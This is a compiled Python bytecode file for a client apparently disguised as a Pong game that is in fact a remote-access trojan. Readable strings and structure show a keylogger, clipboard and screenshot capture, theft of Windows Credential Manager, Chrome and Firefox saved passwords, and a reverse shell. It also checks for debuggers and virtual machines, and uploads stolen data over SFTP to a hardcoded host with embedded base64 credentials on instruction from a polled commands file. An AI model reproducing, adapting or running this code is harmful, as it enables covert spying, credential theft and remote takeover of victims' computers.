a
    I?cU_  ?                   @   s?  d dl Z d dlZd dlT d dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlT d dlZd dlT ejZejZejZdad Z d a!dZ"dZ#dZ$dZ%dZ&G d	d
? d
?Z'dd? Z(dd? Z)dd? Z*dd? Z+dd? Z,dd? Z-dd? Z.dd? Z/d6dd?Z0d7dd?Z1d8dd ?Z2d!d"? Z3d#d$? Z4d%d&? Z5d'd(? Z6d)d*? Z7d+d,? Z8d-d.? Z9d/d0? Z:d dl;Z;d1d2? Z<d3d4? Z=e>d5k?r?e=?  dS )9?    N)?*)?gettrace? ?iz  z192.168.178.87z ZGVza3RvcC00N2V0YWQyXG1hbnVlbA==ZVGVubmlzMTIhc                   @   s<   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? ZdS )?guiGamec                 C   s?   t ??  t j?? | _d\| _| _t j?| j| jf?| _	t j?
d? d| _t ?| jd d | jd d dd?| _t ?| jd | jd d d	d
?| _t ?d	| jd d d	d
?| _t ?d?| _d| _d| _d| _d| _d| _d S )N)i   i?  ZPong?<   ?   ?   ?   ?   ?F   ?
   ??   Zgrey12)??   r   r   ?   r   )?pygame?init?timeZClock?clock?WIDTH?HEIGHT?displayZset_mode?WINZset_caption?FPSZRect?BALL?PLAYER?OPPONENTZColor?BG?GREY?
BALL_VEL_X?
BALL_VEL_Y?
PLAYER_VEL?OPPONENT_VEL??self? r%   ?	client.py?__init__&   s    &"zguiGame.__init__c                 C   s?   | j  j| j7  _| j  j| j7  _| j jdks>| j j| jkrL|  jd9  _| j jdksf| j j	| j
krn| ??  | j ?| j?s?| j ?| j?r?|  jd9  _d S )Nr   ?????)r   ?xr   ?yr    ?top?bottomr   ?left?rightr   ?BALL_restartZcolliderectr   r   r#   r%   r%   r&   ?BALL_animation?   s    zguiGame.BALL_animationc                 C   sB   | j  j| j7  _| j jdkr&d| j _| j j| jkr>| j| j _d S )Nr   )r   r*   r!   r+   r,   r   r#   r%   r%   r&   ?PLAYER_animationM   s
    zguiGame.PLAYER_animationc                 C   s|   | j jd | jjk r&| j  j| j7  _| j jd | jjkrL| j  j| j8  _| j jdkr`d| j _| j j| jkrx| j| j _d S )Nr   r   )r   r+   r   r*   r"   r,   r   r#   r%   r%   r&   ?OPPONENT_animationT   s    zguiGame.OPPONENT_animationc                 C   sD   | j d | jd f| j_|  jt?d?9  _|  jt?d?9  _d S )Nr   )?   r(   )r   r   r   ?centerr    ?randomZchoicer   r#   r%   r%   r&   r/   ^   s    zguiGame.BALL_restartc                 C   s>  t j?? D ]?}|jt jkr*t ??  t??  |jt jkrZ|j	t j
krHd| _|j	t jkrZd| _|jt jkr
|j	t j
krxd| _|j	t jkr
d| _q
| ??  | ??  | ??  | j?| j? t j?| j| j| j? t j?| j| j| j? t j?| j| j| j? t j?| j| j| jd df| jd | jf? t j??  | j ?!| j"? q d S )Nr   i????r   r   )#r   ?event?get?typeZQUIT?quit?sys?exitZKEYDOWN?keyZK_DOWNr!   ZK_UPZKEYUPr0   r1   r2   r   Zfillr   ZdrawZrectr   r   r   Zellipser   Zaaliner   r   r   Zflipr   Ztickr   )r$   r6   r%   r%   r&   ?starte   s0    ,
zguiGame.startN)	?__name__?
__module__?__qualname__r'   r0   r1   r2   r/   r=   r%   r%   r%   r&   r   %   s   
r   c            	      C   s?   t ?? } td?}t ?| t|?? d|j }td?}t?dd|?}t	?
|d t|?d? td?}t ?| t|?d?}d||j|jf d }t|? t|? t?| ? t?|? t?? }t|_|??  t??  d S )	Nr   z\%ds                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   i  Fi   z
[ PID: \%s - \%s - \%s ]?
)?user32ZGetForegroundWindowZc_ulongZGetWindowThreadProcessIdZbyref?valueZcreate_string_buffer?kernel32ZOpenProcess?psapiZGetModuleBaseNameAZGetWindowTextA?print?WriteToFileZCloseHandle?	pyWinhookZHookManager?	KeyStrokeZKeyDownZHookKeyboard?	pythoncomZPumpMessages)	ZhwndZpidZ
process_id?
executableZ	h_processZwindow_titleZlengthZprocessinfoZklr%   r%   r&   ?get_current_process?   s$    


rL   c                 C   s|   t j?tt? ?d ?s>t ?tt? ?d ? ttt? ?d d? ttt? ?d d?}| dkrf|?d? n
|?| ? |??  d S )N?
keystrokes?/keystrokes/keylogger.txt?w?a+z[Space]? ?	?os?path?exists?str?get_path?makedirs?open?write?close??s?filer%   r%   r&   rG   ?   s    
rG   c                 C   sh   t j?tt? ?d ?s>t ?tt? ?d ? ttt? ?d d? ttt? ?d d?}|?| ? |??  d S )NrM   rN   rO   rP   rR   r\   r%   r%   r&   ?WritePasswordToFile?   s    
r_   c                 C   s?   | j tkr2| j atd7 atdtt? d ? t?  d| j  k rHdk rhn nt| j?}t|? t	|? nV| j
dkr?t??  t?? }t??  d| }t|? t	|? nd| j
 }t|? t	|? d	S )
Nr3   ?
screenshot?.png?    ?   ?Vz[PASTE] %s[PASTE]z[%s]T)Z
WindowName?current_window?screenshot_number?SaveScreenshotrV   rL   ZAscii?chrrF   rG   ZKey?win32clipboardZOpenClipboardZGetClipboardDataZCloseClipboard)r6   ?cZpasted_value?p?kr%   r%   r&   rI   ?   s(    





rI   c           
      C   s?   t ?? }t?tj?}t?tj?}t?tj?}t?tj?}t ?	|?}t
?|?}|?? }t
?? }	|	?|||? |?|	? |?d||f|||ftj? tj?tt? ?d ?s?t?tt? ?d ? |	?|tt? ?d |  ? |??  t ?|	?? ? td7 ad S )N)r   r   ?screenshots?/screenshots/r   )?win32guiZGetDesktopWindow?win32apiZGetSystemMetrics?win32conZSM_CXVIRTUALSCREENZSM_CYVIRTUALSCREENZSM_XVIRTUALSCREENZSM_YVIRTUALSCREENZGetWindowDC?win32uiZCreateDCFromHandleZCreateCompatibleDCZCreateBitmapZCreateCompatibleBitmapZSelectObjectZBitBltZSRCCOPYrS   rT   rU   rV   rW   rX   ZSaveBitmapFileZDeleteDCZDeleteObjectZ	GetHandlerf   )
?filenameZhdesktop?widthZheightr-   r+   Z
desktop_dcZimg_dcZmem_dcr`   r%   r%   r&   rg   ?   s$    


rg   c                 C   s.   d}t ?t?t|?d d? ??}|?| ?}|S )NzThis is a key123rb   )?pyaes?AESModeOfOperationCTRrV   ?encodeZencrypt)?messager<   ?aes?
ciphertextr%   r%   r&   ?
AESencrypt   s    
r{   c                 C   s\   t | ?t d?kr2t| d?dd? } | ?d??d?} t?t?t|?d d? ??}|?| ?}|S )NZhallozutf-8r   r(   ?unicode_escape?raw_unicode_escaperb   )r8   ?bytes?decoderw   ru   rv   rV   Zdecrypt)rz   r<   ry   Z	plaintextr%   r%   r&   ?
AESdecrypt  s    
r?   c                  C   s   t j?t j?d??} | S )Nz%userprofile%\)rS   rT   ?join?
expandvars)rT   r%   r%   r&   rW     s    rW   c              
   C   s?   zft ?d d?}|D ]P}t ?|d |d ?}|d rt|? |?d??d?}t|? tdt|? ? qW nl tj	y? } zR| s?|d dkr?td	? n*|d d
kr?td? n|d dkr?td? W Y d }~d S d }~0 0 d S )Nr   Z
TargetName?TypeZCredentialBlobr|   r}   z	Encoded: ?   ?Access denied.??  ?$No credentials stored for this user.i   zWCall for CredEnumerate failed: No such login Session! Does not work for Network Logins.)
?	win32credZCredEnumerateZCredReadr_   rw   r   rF   rV   ?
pywintypes?error)?quietZcredman?i?password?er%   r%   r&   ?get_credman_passwords  s$    

r?   c              
   C   s?  ?z?z?t j?t j?d?ddddddd?}t?||d	 ? t?|d	 ?}|?? }|?	d
? |?
? D ]2}t?|d d d d d?}|d r`tdt|? ? q`W ? n? tj? y? } zH| s?|d dkr?td? nt|? W Y d }~W |??  t ?|d	 ? d S d }~0  tj?yp } zZ| ?sB|d dk?r,td? n|d dk?rBtd? W Y d }~W |??  t ?|d	 ? d S d }~0    td? Y n0 W |??  t ?|d	 ? n|??  t ?|d	 ? 0 d S )N?~?AppDataZLocalZGoogleZChromez	User DataZDefaultz
Login Dataz.bakz=SELECT action_url, username_value, password_value FROM loginsr   r   r3   zChrome Password: ?Database is lockedzJChrome is currently running. This function only works if Chrome is closed.r?   r?   r?   r?   zChrome is not installed.)rS   rT   r?   ?
expanduser?shutilZcopyfile?sqlite3?connect?cursor?execute?fetchall?
win32crypt?CryptUnprotectDatar_   rV   ?OperationalErrorrF   r[   ?remover?   r?   )r?   Zchrome_path?connr?   ?resultr?   r?   r%   r%   r&   ?get_chrome_passwords-  sF    "

?
??r?   c              
   C   s?  ?z|z?t j?t j?d?ddddd?}t ?|?D ]r}|?d?r.t?t j?||d??}|?? }|?	d	? |?
? D ]2}t?|d
 d d d d?}|d rltdt|? ? qlq.W n? tj? y? } z:| s?|d dkr?td? nt|? W Y d }~W |??  d S d }~0  tj?y` } zL| ?s@|d dk?r*td? n|d dk?r@td? W Y d }~W |??  d S d }~0    td? Y n0 W |??  n
|??  0 d S )Nr?   r?   ZRoamingZMozillaZFirefoxZProfilesz.defaultzsignons.sqlitezESELECT hostname, encryptedUsername, encryptedPassword FROM moz_loginsr   r   r3   zFirefox Password: r?   zLFirefox is currently running. This function only works if Firefox is closed.r?   r?   r?   r?   zFirefox not installed.)rS   rT   r?   r?   ?listdir?endswithr?   r?   r?   r?   r?   r?   r?   r_   rV   r?   rF   r[   r?   r?   )r?   Zfirefox_pathr^   r?   r?   r?   r?   r?   r%   r%   r&   ?get_firefox_passwordsM  s>    


?
?r?   c                   C   s    ddkst ?? d krdS dS d S )NFT)r:   r   r%   r%   r%   r&   ?is_debugger_presentn  s    r?   c                   C   s:   z&t j?d?sttd?rW dS W dS W n   Y dS 0 d S )NzC:\Windows\system32\vmcheck.dll?getwindowsversionTF)rS   rT   rU   ?hasattrr:   r%   r%   r%   r&   ?is_vmx  s    
r?   c                 C   s?   d}t ? ? }|?| |f? |?|??? }|?? dkr6qx|?? dksN|?? dkr^t?t?|?? t?|?}|?	|?
? ? q|??  d S )Ni   r;   Zcdzcd ..)?socketr?   Zrecvr   ?lowerrS   ?chdir?
subprocessZ	getoutput?sendrw   r[   )ZSERVER_HOSTZSERVER_PORTZBUFFER_SIZEr]   ?command?outputr%   r%   r&   ?reverse_shell?  s    
r?   c                  C   s0   t ?? } d | _t jtt?t?t?t?| d?}|S )N)ZhostZusernamer?   ?cnopts)	?pysftpZCnOptsZhostkeysZ
Connection?	host_sftp?base64Z	b64decode?username_sftp?password_sftp)r?   ?ftpsr%   r%   r&   ?ftps_connect?  s    r?   c                 C   s,   z| j |dd? W n   td? Y n0 d S )NT)Zpreserve_mtimezError uploading file)ZputrF   ?r?   r^   r%   r%   r&   ?ftps_upload_file?  s    r?   c                 C   s2   z| ? |t|d?j? W n   td? Y n0 d S )N?wbzFile not found)r7   rY   rZ   rF   r?   r%   r%   r&   ?ftps_download_file?  s    r?   c                 C   s:   z | ? t|?? | ?t|?? W n   td? Y n0 d S )NzDirectory exists already)?mkdirrV   r?   rF   ?r?   ?dirr%   r%   r&   ?ftps_create_dir?  s
    r?   c                 C   s6   zt | |? | ?|? W dS    td? Y dS 0 d S )NTzDirectory creation failed!F)r?   r?   rF   r?   r%   r%   r&   ?ftps_check_dir?  s    

r?   c                  C   sX   t ?? D ]J} | d ?d?sL| d ?d?sLdtjv sLdtjv sLttd?sLt? r dS qdS )	Nr3   z	pydevd.pyzpdb.pyZpydevdZpdbr?   TF)?inspect?stackr?   r:   ?modulesr?   r?   )?framer%   r%   r&   ?isDebugging?  s    @r?   c                  C   s<  d} t dkr&td? t? }|??  ?nttj?dkr^tjd dkrRt? }|??  ntd? ?n?td?dkr|t? }|??  ?n?tt	d	? t
?t
jd
kr?dnd? zt? }td? W n   t?d? Y n0 ?z*| dk?rz8|?t
j?d?d ? | d7 } |?t
j?d?d ? W n   Y n0 |?t
j?d?d ? |?dd? |?d? tdd????}|?? }tdt|? ? |dk?r?t?  t?  t?d? t|tt? ?d ? t
?tt? ?d ? ?n|dk?rft
j?tt? ?d ??r?|?d? t|?? ? t |d? d}t|?? ? t?d? t!|k?rPt|tt? ?d t|d ? d ? |d7 }?q|?d? td ? ?nl|d!k?r?t
j?tt? ?d" ??r?|?d#? t |d$? t?d? t|tt? ?d% ? |?d? td&? ?n|d'k?r?t|tt? ?d( ? n?|d)k?rt|tt? ?d* ? n?|d+k?rDt|tt? ?d, ? |?"tt? ?d, ? n?|d-k?rxt|tt? ?d. ? |?"tt? ?d. ? nZ|d/k?r?nNtd0? t?d? t|?}t?d? |?#d1?}|d }t?d? d2}t$||? W d   ? n1 ?s?0    Y  W n.   t
?t
jd
k?rdnd? td3? Y n0 |?%?  t?d? q?d S )4Nr   TzDebugger detected!r3   Zinstallu   Installing... °-°z%Wollen Sie das Spiel starten? (y/n): ?nr%   ?nt?cls?clearz;Connected to FTPS server! Debugging purpose, delete later!!r   ZUSERNAMEZ0_0_2zcommands.txtr   ?rz[+] the command is: zget passwordsr   rN   zget screenshotrn   zrm -rf screenshotsrm   r?   zscreenshots\screenshotra   z..zdone uploading screenshotszget keyloggerz/keystrokes/zrm -rf keystrokesrM   zkeystrokes\keylogger.txtzEUploaded keystrokes to FTPS server! Debugging purpose, delete later!!zget processz/process/process.txtzget systeminfoz/systeminfo/systeminfo.txtz
get webcamz/webcam/webcam.jpgzget microphonez/microphone/microphone.wavzget clipboardzin reverse shell creationrQ   r   zNo commands found on server!)&r?   rF   r   r=   ?lenr:   ?argv?input?start_new_threadrL   rS   ?system?namer?   r   ?sleepr?   ?environr7   r?   r?   rY   ?readrV   r?   r?   r?   rW   rT   rU   r?   r?   r?   rf   ?delete?splitr?   r[   )?countZgamer?   ?fr?   r?   ZipZportr%   r%   r&   ?main?  s?    










$














.r?   ?__main__)r   )r   )r   )?rS   r?   ZctypesrJ   rH   ri   ro   rr   rq   rp   ru   r?   r?   r?   r?   r?   r:   r5   r   r   r?   r?   r   Zsys_gettraceZtkinterr?   ?_threadZwindllrB   rD   rE   re   Zcurrent_hwndrf   Z
expressionZport_reverse_shellr?   r?   r?   r   rL   rG   r_   rI   rg   r{   r?   rW   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r>   r%   r%   r%   r&   ?<module>	   sZ   PHf
"

 
!
w
